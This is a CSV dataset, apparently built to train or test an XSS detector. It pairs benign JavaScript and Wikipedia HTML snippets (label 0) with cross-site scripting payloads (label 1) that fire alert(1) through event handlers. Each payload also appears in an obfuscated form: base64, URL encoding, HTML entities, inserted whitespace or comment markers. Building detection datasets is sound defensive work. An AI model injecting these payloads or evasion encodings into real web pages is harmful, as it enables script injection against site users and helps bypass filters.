sample_id,label,payload_original,payload_obfuscated,generator,recipe
3405,0,"eventhandler.trigger(this._element, event_closed)","eventhandler.trigger(this._element, event_closed)",tool_baseline,none
3406,0,} _handledragtargetdrag(e) { if (!this.options.draggable || this._iscurrentlyfixed() || this._verticallyscrolling) {,} _handledragtargetdrag(e) { if (!this.options.draggable || this._iscurrentlyfixed() || this._verticallyscrolling) {,tool_baseline,none
3407,1,<textarea onselect=alert(1) autofocus>xss</textarea>,PHRleHRhcmVhIG9uc2VsZWN0PWFsZXJ0KDEpIGF1dG9mb2N1cz54c3M8L3RleHRhcmVhPg==,tool_baseline,base64
3408,0,"activeindicator.removeattribute('aria-current'); const newactiveindicator = selectorengine.findone(`[data-bs-slide-to=""${index}""]`, this._indicatorselement); if (newactiveindicator) {","activeindicator.removeattribute('aria-current'); const newactiveindicator = selectorengine.findone(`[data-bs-slide-to=""${index}""]`, this._indicatorselement); if (newactiveindicator) {",tool_baseline,none
3409,1,<abbr onpointerenter=alert(1)>xss</abbr>,&lt;abbr onpointerenter=alert(1)&gt;xss&lt;/abbr&gt;,tool_baseline,html_entities
3410,1,"<script onkeyup=""alert(1)"" contenteditable>test</script>",%3Cscript%20onkeyup%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Fscript%3E,tool_baseline,urlencode
3411,0,"constructor(el, options) { super(parallax, el, options); this.el.m_parallax = this;","constructor(el, options) { super(parallax, el, options); this.el.m_parallax = this;",tool_baseline,none
3412,1,<input onpointerout=alert(1)>xss</input>,<input onpointerout=alert(1)>xss</input>,tool_baseline,whitespace_noise
3413,0,return unique(elems),return unique(elems),tool_baseline,none
3414,0,"</span> <span class=""reference-text""><cite class=""citation news""><a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20161118165842/http://fsroundtable.org/cto-corner-artificial-intelligence-use-in-financial-services/"">""cto corner: artificial intelligence use in financial services – financial services roundtable"" </a>. <i>financial services roundtable </i>. 2 april 2015. archived from <a rel=""nofollow"" class=""external text"" href=""http://fsroundtable.org/cto-corner-artificial-intelligence-use-in-financial-services/"">the original </a> on 18 november 2016<span class=""reference-accessdate"">. retrieved <span class=""nowrap"">18 november","</span> <span class=""reference-text""><cite class=""citation news""><a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20161118165842/http://fsroundtable.org/cto-corner-artificial-intelligence-use-in-financial-services/"">""cto corner: artificial intelligence use in financial services – financial services roundtable"" </a>. <i>financial services roundtable </i>. 2 april 2015. archived from <a rel=""nofollow"" class=""external text"" href=""http://fsroundtable.org/cto-corner-artificial-intelligence-use-in-financial-services/"">the original </a> on 18 november 2016<span class=""reference-accessdate"">. retrieved <span class=""nowrap"">18 november",tool_baseline,none
3415,0,"activeelement.classlist.remove(class_name_active, orderclassname, directionalclassname); this._issliding = false; triggerevent(event_slid);","activeelement.classlist.remove(class_name_active, orderclassname, directionalclassname); this._issliding = false; triggerevent(event_slid);",tool_baseline,none
3416,0,this._keysselected[key] = true,this._keysselected[key] = true,tool_baseline,none
3417,1,<abbr onpointerdown=alert(1)>xss</abbr>,&lt;abbr onpointerdown=alert(1)&gt;xss&lt;/abbr&gt;,tool_baseline,html_entities
3418,0,"}; class materialbox extends component { constructor(el, options) {","}; class materialbox extends component { constructor(el, options) {",tool_baseline,none
3419,1,<meter onpointerenter=alert(1)>xss</meter>,%3Cmeter%20onpointerenter%3Dalert%281%29%3Exss%3C%2Fmeter%3E,tool_baseline,urlencode
3420,1,<form onfocusout=alert(1) tabindex=1 id=x></form><input autofocus>,&lt;form onfocusout=alert(1) tabindex=1 id=x&gt;&lt;/form&gt;&lt;input autofocus&gt;,tool_baseline,html_entities
3421,0,"<li><a href=""/wiki/semantics_(computer_science)"" title=""semantics (computer science)"">semantics </a> </li> </ul>","<li><a href=""/wiki/semantics_(computer_science)"" title=""semantics (computer science)"">semantics </a> </li> </ul>",tool_baseline,none
3422,1,<bdo id=x tabindex=1 onfocusin=alert(1)></bdo>,%3Cbdo%20id%3Dx%20tabindex%3D1%20onfocusin%3Dalert%281%29%3E%3C%2Fbdo%3E,tool_baseline,urlencode
3423,0,this._settabsandtabwidth(); this._animateindicator(previndex); e.preventdefault();,this._settabsandtabwidth(); this._animateindicator(previndex); e.preventdefault();,tool_baseline,none
3424,0,"a.key.tolowercase(), b.key.tolowercase(), val.tolowercase()","a.key.tolowercase(), b.key.tolowercase(), val.tolowercase()",tool_baseline,none
3425,1,<colgroup onpointerleave=alert(1)>xss</colgroup>,%3Ccolgroup%20onpointerleave%3Dalert%281%29%3Exss%3C%2Fcolgroup%3E,tool_baseline,urlencode
3426,0,let scrolltop = container.scrolltop; let scrolledx = bounding.left - scrollleft; let scrolledy = bounding.top - scrolltop;,let scrolltop = container.scrolltop; let scrolledx = bounding.left - scrollleft; let scrolledy = bounding.top - scrolltop;,tool_baseline,none
3427,0,_this29.timeremaining -= 20; } if (_this29.timeremaining <= 0) {,_this29.timeremaining -= 20; } if (_this29.timeremaining <= 0) {,tool_baseline,none
3428,1,"<style>:target {color: red;}</style><h1 id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></h1>",%3Cstyle%3E%3Atarget%20%7Bcolor%3A%20red%3B%7D%3C%2Fstyle%3E%3Ch1%20id%3Dx%20style%3D%22transition%3Acolor%2010s%22%20ontransitioncancel%3Dalert%281%29%3E%3C%2Fh1%3E,tool_baseline,urlencode
3429,0,"<li id=""cite_note-ars_electronica_exhibition_&#39;&#39;understanding_ai&#39;&#39;-348""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-ars_electronica_exhibition_&#39;&#39;understanding_ai&#39;&#39;_348-0"">^ </a> </b>","<li id=""cite_note-ars_electronica_exhibition_&#39;&#39;understanding_ai&#39;&#39;-348""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-ars_electronica_exhibition_&#39;&#39;understanding_ai&#39;&#39;_348-0"">^ </a> </b>",tool_baseline,none
3430,0,return element; } return m.getoverflowparent(element.parentelement);,return element; } return m.getoverflowparent(element.parentelement);,tool_baseline,none
3431,1,"<style>:target {transform: rotate(180deg);}</style><td id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></td>",PHN0eWxlPjp0YXJnZXQge3RyYW5zZm9ybTogcm90YXRlKDE4MGRlZyk7fTwvc3R5bGU+PHRkIGlkPXggc3R5bGU9InRyYW5zaXRpb246dHJhbnNmb3JtIDJzIiBvbnRyYW5zaXRpb25ydW49YWxlcnQoMSk+PC90ZD4=,tool_baseline,base64
3432,1,<animatemotion onpointerdown=alert(1)>xss</animatemotion>,&lt;animatemotion onpointerdown=alert(1)&gt;xss&lt;/animatemotion&gt;,tool_baseline,html_entities
3433,1,"<hr onmouseup=""alert(1)"">test</hr>",%3Chr%20onmouseup%3D%22alert%281%29%22%3Etest%3C%2Fhr%3E,tool_baseline,urlencode
3434,0,$this.attr('placeholder') !== null,$this.attr('placeholder') !== null,tool_baseline,none
3435,0,"'clean:temp' ]); grunt.task.registertask('configurebabel', 'configures babel options', function() {","'clean:temp' ]); grunt.task.registertask('configurebabel', 'configures babel options', function() {",tool_baseline,none
3436,1,<footer id=x tabindex=1 onfocusin=alert(1)></footer>,PGZvb3RlciBpZD14IHRhYmluZGV4PTEgb25mb2N1c2luPWFsZXJ0KDEpPjwvZm9vdGVyPg==,tool_baseline,base64
3437,1,<title onfocusout=alert(1) tabindex=1 id=x></title><input autofocus>,%3Ctitle%20onfocusout%3Dalert%281%29%20tabindex%3D1%20id%3Dx%3E%3C%2Ftitle%3E%3Cinput%20autofocus%3E,tool_baseline,urlencode
3438,1,<tfoot id=x tabindex=1 onbeforedeactivate=alert(1)></tfoot><input autofocus>,<t/*OBF*/foot id=x tabindex=1 on/*OBF*/beforedeactivate=aler/*OBF*/t(1)></tfoot><input auto/*OBF*/foc/*OBF*/us>,tool_baseline,comment_marker
3439,0,const button = event.relatedtarget,const button = event.relatedtarget,tool_baseline,none
3440,0,let heightpercent = this.originalheight / this.windowheight,let heightpercent = this.originalheight / this.windowheight,tool_baseline,none
3441,1,<multicol onpointerdown=alert(1)>xss</multicol>,%3Cmulticol%20onpointerdown%3Dalert%281%29%3Exss%3C%2Fmulticol%3E,tool_baseline,urlencode
3442,1,"<frameset onkeyup=""alert(1)"" contenteditable>test</frameset>","<frameset onkeyup=""alert(  1)  "" contenteditable> test</frameset>",tool_baseline,whitespace_noise
3443,0,"}; toggle(selector_dropdown_toggle, class_name_active); toggle(selector_dropdown_menu, class_name_show);","}; toggle(selector_dropdown_toggle, class_name_active); toggle(selector_dropdown_menu, class_name_show);",tool_baseline,none
3444,0,_configaftermerge(config) { config.toggle = boolean(config.toggle) // coerce string values config.parent = getelement(config.parent),_configaftermerge(config) { config.toggle = boolean(config.toggle) // coerce string values config.parent = getelement(config.parent),tool_baseline,none
3445,0,"this._menu.classlist.remove(class_name_show); this._element.classlist.remove(class_name_show); this._element.setattribute('aria-expanded', 'false');","this._menu.classlist.remove(class_name_show); this._element.classlist.remove(class_name_show); this._element.setattribute('aria-expanded', 'false');",tool_baseline,none
3446,0,"x += max(html.clientwidth, body ? body.clientwidth : 0) - width","x += max(html.clientwidth, body ? body.clientwidth : 0) - width",tool_baseline,none
3447,1,<fieldset onpointerleave=alert(1)>xss</fieldset>,<fieldset onpointerleave=alert(1)>xss</fieldset>,tool_baseline,whitespace_noise
3448,0,"<li><a href=""#citerefnilsson1998"">nilsson 1998 </a>, chpt. 4.2, </li>","<li><a href=""#citerefnilsson1998"">nilsson 1998 </a>, chpt. 4.2, </li>",tool_baseline,none
3449,0,"complete: function (anim) { $body.css({ overflow: '',","complete: function (anim) { $body.css({ overflow: '',",tool_baseline,none
3450,0,"let top = m.getdocumentscrolltop(),","let top = m.getdocumentscrolltop(),",tool_baseline,none
3451,0,"return domelem.m_scrollspy; } }, {","return domelem.m_scrollspy; } }, {",tool_baseline,none
3452,0,if (this.activeindex >= 0) { this.$active = $(this.container) .children('li'),if (this.activeindex >= 0) { this.$active = $(this.container) .children('li'),tool_baseline,none
3453,0,_this31.isdragged = false; _this31.lastwindowwidth = window.innerwidth; _this31.lastwindowheight = window.innerheight;,_this31.isdragged = false; _this31.lastwindowwidth = window.innerwidth; _this31.lastwindowheight = window.innerheight;,tool_baseline,none
3454,1,"<hr draggable=""true"" ondragenter=""alert(1)"">test</hr>",%3Chr%20draggable%3D%22true%22%20ondragenter%3D%22alert%281%29%22%3Etest%3C%2Fhr%3E,tool_baseline,urlencode
3455,1,"<div draggable=""true"" contenteditable>drag me</div><acronym ondragover=alert(1) contenteditable>drop here</acronym>",%3Cdiv%20draggable%3D%22true%22%20contenteditable%3Edrag%20me%3C%2Fdiv%3E%3Cacronym%20ondragover%3Dalert%281%29%20contenteditable%3Edrop%20here%3C%2Facronym%3E,tool_baseline,urlencode
3456,1,<b id=x tabindex=1 onfocusin=alert(1)></b>,<b id= x tabindex=1 onfocusin=alert( 1)></b>,tool_baseline,whitespace_noise
3457,1,<audio id=x tabindex=1 onbeforedeactivate=alert(1)></audio><input autofocus>,&lt;audio id=x tabindex=1 onbeforedeactivate=alert(1)&gt;&lt;/audio&gt;&lt;input autofocus&gt;,tool_baseline,html_entities
3458,0,}) const alreadyopen = selectorengine.findone(open_selector) if (alreadyopen && alreadyopen !== target) {,}) const alreadyopen = selectorengine.findone(open_selector) if (alreadyopen && alreadyopen !== target) {,tool_baseline,none
3459,1,"<output ondblclick=""alert(1)"">test</output>","<output ondblclick=""alert(1)"">test</output>",tool_baseline,comment_marker
3460,1,<embed onpointerup=alert(1)>xss</embed>,PGVtYmVkIG9ucG9pbnRlcnVwPWFsZXJ0KDEpPnhzczwvZW1iZWQ+,tool_baseline,base64
3461,1,"<output draggable=""true"" ondrag=""alert(1)"">test</output>",&lt;output draggable=&quot;true&quot; ondrag=&quot;alert(1)&quot;&gt;test&lt;/output&gt;,tool_baseline,html_entities
3462,0,"this._popper = null this._parent = this._element.parentnode // dropdown wrapper this._menu = selectorengine.next(this._element, selector_menu)[0] ||","this._popper = null this._parent = this._element.parentnode // dropdown wrapper this._menu = selectorengine.next(this._element, selector_menu)[0] ||",tool_baseline,none
3463,1,"<span onpaste=""alert(1)"" contenteditable>test</span>","<span onpaste= ""alert(1) "" contenteditable>test</span>",tool_baseline,whitespace_noise
3464,1,<fieldset onpointerover=alert(1)>xss</fieldset>,PGZpZWxkc2V0IG9ucG9pbnRlcm92ZXI9YWxlcnQoMSk+eHNzPC9maWVsZHNldD4=,tool_baseline,base64
3465,1,"<div draggable=""true"" contenteditable>drag me</div><optgroup ondrop=alert(1) contenteditable>drop here</optgroup>",&lt;div draggable=&quot;true&quot; contenteditable&gt;drag me&lt;/div&gt;&lt;optgroup ondrop=alert(1) contenteditable&gt;drop here&lt;/optgroup&gt;,tool_baseline,html_entities
3466,1,"<listing onkeypress=""alert(1)"" contenteditable>test</listing>",PGxpc3Rpbmcgb25rZXlwcmVzcz0iYWxlcnQoMSkiIGNvbnRlbnRlZGl0YWJsZT50ZXN0PC9saXN0aW5nPg==,tool_baseline,base64
3467,0,"} getnextactiveelement(items, target, key === arrow_down_key$1, !items.includes(target)).focus(); }","} getnextactiveelement(items, target, key === arrow_down_key$1, !items.includes(target)).focus(); }",tool_baseline,none
3468,1,<caption onblur=alert(1) tabindex=1 id=x></caption><input autofocus>,PGNhcHRpb24gb25ibHVyPWFsZXJ0KDEpIHRhYmluZGV4PTEgaWQ9eD48L2NhcHRpb24+PGlucHV0IGF1dG9mb2N1cz4=,tool_baseline,base64
3469,1,"<style>@keyframes x{}</style><button style=""animation-name:x"" onanimationstart=""alert(1)""></button>",%3Cstyle%3E%40keyframes%20x%7B%7D%3C%2Fstyle%3E%3Cbutton%20style%3D%22animation-name%3Ax%22%20onanimationstart%3D%22alert%281%29%22%3E%3C%2Fbutton%3E,tool_baseline,urlencode
3470,1,"<style>@keyframes slidein {}</style><* style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></*>",%3Cstyle%3E%40keyframes%20slidein%20%7B%7D%3C%2Fstyle%3E%3C%2A%20style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22%20onwebkitanimationiteration%3D%22alert%281%29%22%3E%3C%2F%2A%3E,tool_baseline,urlencode
3471,0,this.xnumsteps = [ false ],this.xnumsteps = [ false ],tool_baseline,none
3472,0,typeof exports === 'object' && typeof module !== 'undefined' ? module.exports = factory(require('@popperjs/core')) :,typeof exports === 'object' && typeof module !== 'undefined' ? module.exports = factory(require('@popperjs/core')) :,tool_baseline,none
3473,0,function s4() { return math.floor((1 + math.random()) * 0x10000).tostring(16).substring(1); },function s4() { return math.floor((1 + math.random()) * 0x10000).tostring(16).substring(1); },tool_baseline,none
3474,1,<hgroup onpointerdown=alert(1)>xss</hgroup>,PGhncm91cCBvbnBvaW50ZXJkb3duPWFsZXJ0KDEpPnhzczwvaGdyb3VwPg==,tool_baseline,base64
3475,1,"<noembed draggable=""true"" ondragend=""alert(1)"">test</noembed>","<noembed draggabl/*OBF*/e=""true"" ondragend=""alert(1)"">te/*OBF*/st</noembed>",tool_baseline,comment_marker
3476,0,"<p>the field of machine ethics is concerned with giving machines ethical principles, or a procedure for discovering a way to resolve the ethical dilemmas they might encounter, enabling them to function in an ethically responsible manner through their own ethical decision making.<sup id=""cite_ref-autogenerated1_397-0"" class=""reference""><a href=""#cite_note-autogenerated1-397"">&#91;386&#93; </a> </sup> the field was delineated in the aaai fall 2005 symposium on machine ethics: ""past research concerning the relationship between technology and ethics has largely focused on responsible and irresponsible use of technology by human beings, with a few people being interested in how human beings ought to treat machines. in all cases, only human beings have engaged in ethical reasoning. the time has come for adding an ethical dimension to at least some machines. recognition of the ethical ramifications of behavior involving machines, as well as recent and potential developments in machine autonomy, necessitate this. in contrast to computer hacking, software property issues, privacy issues and other topics normally ascribed to computer ethics, machine ethics is concerned with the behavior of machines towards human users and other machines. research in machine ethics is key to alleviating concerns with autonomous systems—it could be argued that the notion of autonomous machines without such a dimension is at the root of all fear concerning machine intelligence. further, investigation of machine ethics could enable the discovery of problems with current ethical theories, advancing our thinking about ethics.""<sup id=""cite_ref-autogenerated2_398-0"" class=""reference""><a href=""#cite_note-autogenerated2-398"">&#91;387&#93; </a> </sup> machine ethics is sometimes referred to as machine morality, computational ethics or computational morality. a variety of perspectives of this nascent field can be found in the collected edition ""machine ethics""<sup id=""cite_ref-autogenerated1_397-1"" class=""reference""><a href=""#cite_note-autogenerated1-397"">&#91;386&#93; </a> </sup> that stems from the aaai fall 2005 symposium on machine ethics.<sup id=""cite_ref-autogenerated2_398-1"" class=""reference""><a href=""#cite_note-autogenerated2-398"">&#91;387&#93; </a> </sup>","<p>the field of machine ethics is concerned with giving machines ethical principles, or a procedure for discovering a way to resolve the ethical dilemmas they might encounter, enabling them to function in an ethically responsible manner through their own ethical decision making.<sup id=""cite_ref-autogenerated1_397-0"" class=""reference""><a href=""#cite_note-autogenerated1-397"">&#91;386&#93; </a> </sup> the field was delineated in the aaai fall 2005 symposium on machine ethics: ""past research concerning the relationship between technology and ethics has largely focused on responsible and irresponsible use of technology by human beings, with a few people being interested in how human beings ought to treat machines. in all cases, only human beings have engaged in ethical reasoning. the time has come for adding an ethical dimension to at least some machines. recognition of the ethical ramifications of behavior involving machines, as well as recent and potential developments in machine autonomy, necessitate this. in contrast to computer hacking, software property issues, privacy issues and other topics normally ascribed to computer ethics, machine ethics is concerned with the behavior of machines towards human users and other machines. research in machine ethics is key to alleviating concerns with autonomous systems—it could be argued that the notion of autonomous machines without such a dimension is at the root of all fear concerning machine intelligence. further, investigation of machine ethics could enable the discovery of problems with current ethical theories, advancing our thinking about ethics.""<sup id=""cite_ref-autogenerated2_398-0"" class=""reference""><a href=""#cite_note-autogenerated2-398"">&#91;387&#93; </a> </sup> machine ethics is sometimes referred to as machine morality, computational ethics or computational morality. a variety of perspectives of this nascent field can be found in the collected edition ""machine ethics""<sup id=""cite_ref-autogenerated1_397-1"" class=""reference""><a href=""#cite_note-autogenerated1-397"">&#91;386&#93; </a> </sup> that stems from the aaai fall 2005 symposium on machine ethics.<sup id=""cite_ref-autogenerated2_398-1"" class=""reference""><a href=""#cite_note-autogenerated2-398"">&#91;387&#93; </a> </sup>",tool_baseline,none
3477,0,this._observer.disconnect(),this._observer.disconnect(),tool_baseline,none
3478,0,"this.dragtarget.addeventlistener('touchmove', this._handledragtargetdragbound)","this.dragtarget.addeventlistener('touchmove', this._handledragtargetdragbound)",tool_baseline,none
3479,1,"<blockquote draggable=""true"" ondragleave=""alert(1)"">test</blockquote>","<blockquote draggable=""true"" ondragleave="" alert(1)"">  test</blockquote>",tool_baseline,whitespace_noise
3480,1,<table id=x tabindex=1 onbeforedeactivate=alert(1)></table><input autofocus>,%3Ctable%20id%3Dx%20tabindex%3D1%20onbeforedeactivate%3Dalert%281%29%3E%3C%2Ftable%3E%3Cinput%20autofocus%3E,tool_baseline,urlencode
3481,0,"this._setattributeifnotexists(target, 'role', 'tabpanel'); if (child.id) { this._setattributeifnotexists(target, 'aria-labelledby', `${child.id}`);","this._setattributeifnotexists(target, 'role', 'tabpanel'); if (child.id) { this._setattributeifnotexists(target, 'aria-labelledby', `${child.id}`);",tool_baseline,none
3482,1,<u onpointerover=alert(1)>xss</u>,%3Cu%20onpointerover%3Dalert%281%29%3Exss%3C%2Fu%3E,tool_baseline,urlencode
3483,1,"<style>:target {color: red;}</style><kbd id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></kbd>","<style>:target {color: red;}<  /style><kbd id=x style=  ""transition:color 10s"" ontransitioncancel=alert(  1)></ kbd>",tool_baseline,whitespace_noise
3484,0,"this.el.addeventlistener('click', this._handlecarouselclickbound)","this.el.addeventlistener('click', this._handlecarouselclickbound)",tool_baseline,none
3485,0,static get defaulttype() { return defaulttype$5; },static get defaulttype() { return defaulttype$5; },tool_baseline,none
3486,0,"<li><a href=""/wiki/conventionalism"" title=""conventionalism"">conventionalism </a> </li>","<li><a href=""/wiki/conventionalism"" title=""conventionalism"">conventionalism </a> </li>",tool_baseline,none
3487,1,<svg><spacer onload=alert(1)></spacer>,%3Csvg%3E%3Cspacer%20onload%3Dalert%281%29%3E%3C%2Fspacer%3E,tool_baseline,urlencode
3488,1,"<legend onmouseleave=""alert(1)"">test</legend>",%3Clegend%20onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Flegend%3E,tool_baseline,urlencode
3489,0,this.ishovered = false; this.isfocused = false; this._appendtooltipel();,this.ishovered = false; this.isfocused = false; this._appendtooltipel();,tool_baseline,none
3490,0,"$textarea.css('height', hiddendiv.innerheight() + 'px'); } else if ($textarea[0].value.length < $textarea.data('previous-length')) { $textarea.css('height', $textarea.data('original-height') + 'px');","$textarea.css('height', hiddendiv.innerheight() + 'px'); } else if ($textarea[0].value.length < $textarea.data('previous-length')) { $textarea.css('height', $textarea.data('original-height') + 'px');",tool_baseline,none
3491,0,"if (typeof window.ontouchstart !== 'undefined') { this.el.removeeventlistener('touchstart', this._handlecarouseltapbound); this.el.removeeventlistener('touchmove', this._handlecarouseldragbound);","if (typeof window.ontouchstart !== 'undefined') { this.el.removeeventlistener('touchstart', this._handlecarouseltapbound); this.el.removeeventlistener('touchmove', this._handlecarouseldragbound);",tool_baseline,none
3492,0,"}, { key: ""_handlerangemousedowntouchstart"", value: function _handlerangemousedowntouchstart(e) {","}, { key: ""_handlerangemousedowntouchstart"", value: function _handlerangemousedowntouchstart(e) {",tool_baseline,none
3493,0,if ( handlenumber === false ) { return false; },if ( handlenumber === false ) { return false; },tool_baseline,none
3494,1,<figcaption onblur=alert(1) tabindex=1 id=x></figcaption><input autofocus>,PGZpZ2NhcHRpb24gb25ibHVyPWFsZXJ0KDEpIHRhYmluZGV4PTEgaWQ9eD48L2ZpZ2NhcHRpb24+PGlucHV0IGF1dG9mb2N1cz4=,tool_baseline,base64
3495,0,"document.removeeventlistener('scroll', pushpin._updateelements); } _updateposition() {","document.removeeventlistener('scroll', pushpin._updateelements); } _updateposition() {",tool_baseline,none
3496,0,!$target.parent().hasclass('is-disabled') ) { this.setdate(,!$target.parent().hasclass('is-disabled') ) { this.setdate(,tool_baseline,none
3497,0,"<li><a href=""#citerefnilsson1998"">nilsson 1998 </a>, chpt. 10.3, 17.5 </li> </ul>","<li><a href=""#citerefnilsson1998"">nilsson 1998 </a>, chpt. 10.3, 17.5 </li> </ul>",tool_baseline,none
3498,0,"return _get(timepicker.__proto__ || object.getprototypeof(timepicker), ""init"", this).call(this, this, els, options)","return _get(timepicker.__proto__ || object.getprototypeof(timepicker), ""init"", this).call(this, this, els, options)",tool_baseline,none
3499,1,"<style>:target {color: red;}</style><menuitem id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></menuitem>","<styl/*OBF*/e>:target {color: red/*OBF*/;}</style><menuitem id=x style=""transition:color 10s"" ontransitioncanc/*OBF*/el=alert(1)></menuitem>",tool_baseline,comment_marker
3500,0,currchips.deletechip(index),currchips.deletechip(index),tool_baseline,none
3501,0,return liel[0]; } _toggleentryfromarray(key) {,return liel[0]; } _toggleentryfromarray(key) {,tool_baseline,none
3502,0,if (defaultprevented) {,if (defaultprevented) {,tool_baseline,none
3503,1,<video onpointerenter=alert(1)>xss</video>,<video onpointerenter=alert(1)>xss</video>,tool_baseline,comment_marker
3504,0,} $(this).closest('.chip').remove(); });,} $(this).closest('.chip').remove(); });,tool_baseline,none
3505,0,this.isfixed = this.el.classlist.contains('sidenav-fixed'),this.isfixed = this.el.classlist.contains('sidenav-fixed'),tool_baseline,none
3506,0,"<p>many ai algorithms are capable of learning from data; they can enhance themselves by learning new <a href=""/wiki/heuristic_(computer_science)"" title=""heuristic (computer science)"">heuristics </a> (strategies, or ""rules of thumb"", that have worked well in the past), or can themselves write other algorithms. some of the ""learners"" described below, including bayesian networks, decision trees, and nearest-neighbor, could theoretically, (given infinite data, time, and memory) learn to approximate any <a href=""/wiki/function_(mathematics)"" title=""function (mathematics)"">function </a>, including which combination of mathematical functions would best describe the world<sup class=""noprint inline-template template-fact"" style=""white-space:nowrap;"">&#91;<i><a href=""/wiki/wikipedia:citation_needed"" title=""wikipedia:citation needed""><span title=""this claim needs references to reliable sources. (june 2019)"">citation needed","<p>many ai algorithms are capable of learning from data; they can enhance themselves by learning new <a href=""/wiki/heuristic_(computer_science)"" title=""heuristic (computer science)"">heuristics </a> (strategies, or ""rules of thumb"", that have worked well in the past), or can themselves write other algorithms. some of the ""learners"" described below, including bayesian networks, decision trees, and nearest-neighbor, could theoretically, (given infinite data, time, and memory) learn to approximate any <a href=""/wiki/function_(mathematics)"" title=""function (mathematics)"">function </a>, including which combination of mathematical functions would best describe the world<sup class=""noprint inline-template template-fact"" style=""white-space:nowrap;"">&#91;<i><a href=""/wiki/wikipedia:citation_needed"" title=""wikipedia:citation needed""><span title=""this claim needs references to reliable sources. (june 2019)"">citation needed",tool_baseline,none
3507,0,"window.index.add({ href: 'http://materializecss.com/getting-started.html', title: 'getting started',","window.index.add({ href: 'http://materializecss.com/getting-started.html', title: 'getting started',",tool_baseline,none
3508,0,_this26._setupeventhandlers(); return _this26; },_this26._setupeventhandlers(); return _this26; },tool_baseline,none
3509,0,return name } dispose() {,return name } dispose() {,tool_baseline,none
3510,0,"return document.queryselectorall(a); } catch (c) {} }function r(a, c) {","return document.queryselectorall(a); } catch (c) {} }function r(a, c) {",tool_baseline,none
3511,0,"m.checkpossiblealignments = function(el, container, bounding, offset) {","m.checkpossiblealignments = function(el, container, bounding, offset) {",tool_baseline,none
3512,0,this._scrollbar = new scrollbarhelper() this._addeventlisteners() },this._scrollbar = new scrollbarhelper() this._addeventlisteners() },tool_baseline,none
3513,0,if (!object || typeof object !== 'object') { return false; },if (!object || typeof object !== 'object') { return false; },tool_baseline,none
3514,0,"ripple.setattribute('style', convertstyle(ripplestyle)); }, hide: function (e) {","ripple.setattribute('style', convertstyle(ripplestyle)); }, hide: function (e) {",tool_baseline,none
3515,1,"<style>:target {color:red;}</style><samp id=x style=""transition:color 1s"" ontransitionend=alert(1)></samp>",&lt;style&gt;:target {color:red;}&lt;/style&gt;&lt;samp id=x style=&quot;transition:color 1s&quot; ontransitionend=alert(1)&gt;&lt;/samp&gt;,tool_baseline,html_entities
3516,0,return overflow[side] >= 0; }); },return overflow[side] >= 0; }); },tool_baseline,none
3517,1,"<template oncontextmenu=""alert(1)"">test</template>",%3Ctemplate%20oncontextmenu%3D%22alert%281%29%22%3Etest%3C%2Ftemplate%3E,tool_baseline,urlencode
3518,0,if (this._ishovered === false) {,if (this._ishovered === false) {,tool_baseline,none
3519,0,parallaxinstance._enabled = window.innerwidth > parallaxinstance.options.responsivethreshold,parallaxinstance._enabled = window.innerwidth > parallaxinstance.options.responsivethreshold,tool_baseline,none
3520,0,if ( entry.min === undefined || entry.max === undefined ) {,if ( entry.min === undefined || entry.max === undefined ) {,tool_baseline,none
3521,1,"b=""url(\"""";",b%3D%22url%28%5C%22%22%3B,tool_baseline,urlencode
3522,0,"<li><a href=""/wiki/decision_theory"" title=""decision theory"">decision theory </a> </li>","<li><a href=""/wiki/decision_theory"" title=""decision theory"">decision theory </a> </li>",tool_baseline,none
3523,0,"c[key] = node.dataset ? node.dataset[key] : cash(node).attr(""data-"" + key)","c[key] = node.dataset ? node.dataset[key] : cash(node).attr(""data-"" + key)",tool_baseline,none
3524,1,"<q onpaste=""alert(1)"" contenteditable>test</q>",PHEgb25wYXN0ZT0iYWxlcnQoMSkiIGNvbnRlbnRlZGl0YWJsZT50ZXN0PC9xPg==,tool_baseline,base64
